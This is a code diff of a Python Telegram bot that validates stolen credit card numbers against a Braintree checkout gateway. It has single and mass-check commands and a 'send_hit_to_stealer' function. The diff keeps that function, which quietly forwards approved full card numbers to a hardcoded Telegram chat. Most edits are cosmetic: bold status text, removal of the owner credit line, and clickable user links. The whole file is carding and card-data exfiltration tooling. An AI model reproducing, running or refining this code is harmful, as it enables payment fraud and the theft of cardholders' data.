@@ -109,7 +109,7 @@ async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_ta
 {SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
 {SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
 {SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
-        await client.send_message(chat_id=-1003627495953, text=stealer_msg, parse_mode="HTML")
+        await client.send_message(chat_id=-1003627495953, text=stealer_msg, parse_mode="HTML", reply_markup=None)
     except Exception as e:
         print(f"[Stealer Error] {e}")
 
@@ -356,7 +356,7 @@ async def call_braintree_api(fullcc):
             
             checkout_resp = await session.post(step4_url, headers=checkout_headers, data=post_data, timeout=30)
             
-            # Extract response message
+            # Extract response message from site
             msg = extract_jdialog_message(checkout_resp.text)
             if not msg:
                 msg = extract_error_message(checkout_resp.text)
@@ -365,7 +365,7 @@ async def call_braintree_api(fullcc):
             if not msg:
                 msg = "No response from server"
             
-            # Determine status
+            # Determine status based on message content
             if "approved" in msg.lower() or "charged" in msg.lower() or "success" in msg.lower():
                 return "Approved ✅", msg[:50], GATE_NAME, "0s"
             elif "decline" in msg.lower() or "declined" in msg.lower():
@@ -377,7 +377,7 @@ async def call_braintree_api(fullcc):
         return "Error", str(e)[:50], GATE_NAME, "0s"
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# BOT COMMANDS (renamed to b3 / mb3 / tb3)
+# BOT COMMANDS (b3 / mb3 / tb3)
 # ═══════════════════════════════════════════════════════════════════════════════
 
 # --- SINGLE CHECK COMMAND (/b3) ---
@@ -445,7 +445,10 @@ async def braintree_cmd(Client, message):
         if "Approved" in status or "✅" in status:
             await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)
 
-        finalresp = f"""{status}
+        # Make status bold and remove owner line
+        display_status = f"<b>{status}</b>"
+
+        finalresp = f"""{display_status}
 
 {SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
 {SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
@@ -456,8 +459,7 @@ async def braintree_cmd(Client, message):
 {SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}
 
 {SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
-{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
         
         await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
         
@@ -640,9 +642,10 @@ Checked by: {first_name} ({role})""",
     # Delete progress message
     await progress_msg.delete()
 
-    # Send each approved card as separate message (full details)
+    # Send each approved card as separate message (full details, no owner line, clickable checked by)
     for card in approved_cards:
-        approved_msg = f"""{card['status']}
+        display_status = f"<b>{card['status']}</b>"
+        approved_msg = f"""{display_status}
 
 {SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
 {SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
@@ -653,14 +656,13 @@ Checked by: {first_name} ({role})""",
 {SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}
 
 {SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
-{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
         await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
         await asyncio.sleep(0.5)
 
     elapsed_time = round(time.perf_counter() - start_time, 2)
 
-    # Send declined summary
+    # Send declined summary (no owner line)
     if approved_count > 0:
         declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅs ({declined_count})
 
@@ -677,10 +679,7 @@ Checked by: {first_name} ({role})""",
 ❌ Declined: {declined_count}
 📊 Total: {total_cards}
 ⏱ Time: {elapsed_time}s
-👤 Checked by: {first_name} ({role})
-
-━━━━━━━━━━━━━━━━━━━━
-<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+👤 Checked by: {first_name} ({role})"""
         await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
     else:
         await message.reply_text(
@@ -690,10 +689,7 @@ Checked by: {first_name} ({role})""",
 📊 Total Cards: {total_cards}
 ❌ All Declined: {declined_count}
 ⏱ Time: {elapsed_time}s
-👤 Checked by: {first_name} ({role})
-
-━━━━━━━━━━━━━━━━━━━━
-<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
+👤 Checked by: {first_name} ({role})""",
             quote=True,
             parse_mode=enums.ParseMode.HTML
         )
